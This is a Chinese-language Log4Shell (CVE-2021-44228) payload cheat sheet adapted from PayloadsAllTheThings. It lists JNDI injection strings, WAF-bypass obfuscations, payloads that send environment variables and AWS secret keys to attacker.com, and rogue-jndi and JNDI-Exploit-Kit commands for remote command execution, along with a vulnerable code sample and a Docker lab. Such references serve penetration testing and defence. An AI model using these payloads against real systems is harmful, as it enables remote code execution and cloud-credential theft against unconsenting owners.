# Log4Shell - CVE-2021-44228

[SEARCH_KEYWORDS]
漏洞类型: Log4Shell Log4j RCE JNDI Injection 远程代码执行
攻击类型: Remote Code Execution Information Disclosure
关键词: Log4j JNDI LDAP RMI log4shell CVE-2021-44228
技术: JNDI Injection LDAP Lookup Message Lookup Substitution
CVE: CVE-2021-44228 CVE-2021-45046
版本: Apache Log4j2 <=2.14.1

[CONTENT]

## Log4Shell概述

Apache Log4j2 <=2.14.1的JNDI功能存在漏洞，当消息查找替换启用时，攻击者可控制日志消息或参数，从LDAP服务器加载并执行任意代码。

## 漏洞代码示例

```java
public String index(@RequestHeader("X-Api-Version") String apiVersion) {
    logger.info("Received a request for API version " + apiVersion);
    return "Hello, world!";
}
```

## 基本Payload

```bash
# 识别Java版本和主机名
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# 枚举关键字和变量
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```

## 扫描工具

### log4j-scan

```powershell
python3 log4j-scan.py -u http://127.0.0.1:8081 --run-all-test
python3 log4j-scan.py -u http://127.0.0.1:808 --waf-bypass
```

### Nuclei Template

```powershell
nuclei -t cves/2021/CVE-2021-44228.yaml -u http://target.com
```

## WAF绕过

```powershell
# 使用::-绕过
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a}

# 使用lower和upper
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

# 使用env变量构造字母
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
```

## 利用技术

### 环境变量外带

```powershell
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/

# AWS凭证泄露
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
```

### 远程命令执行

#### rogue-jndi

```ps1
java -jar target/RogueJndi-1.1.jar --command "touch /tmp/toto" --hostname "192.168.1.21"
```

支持的端点:
- `ldap://192.168.1.10:1389/o=reference`
- `ldap://192.168.1.10:1389/o=tomcat`
- `ldap://192.168.1.10:1389/o=groovy`
- `ldap://192.168.1.10:1389/o=websphere1`
- `ldap://192.168.1.10:1389/o=websphere2`

#### JNDI-Exploit-Kit

```powershell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/toto" -A "192.168.1.21"
```

## 本地测试

```powershell
docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

## 参考文档

原始来源: PayloadsAllTheThings/CVE Exploits/Log4Shell.md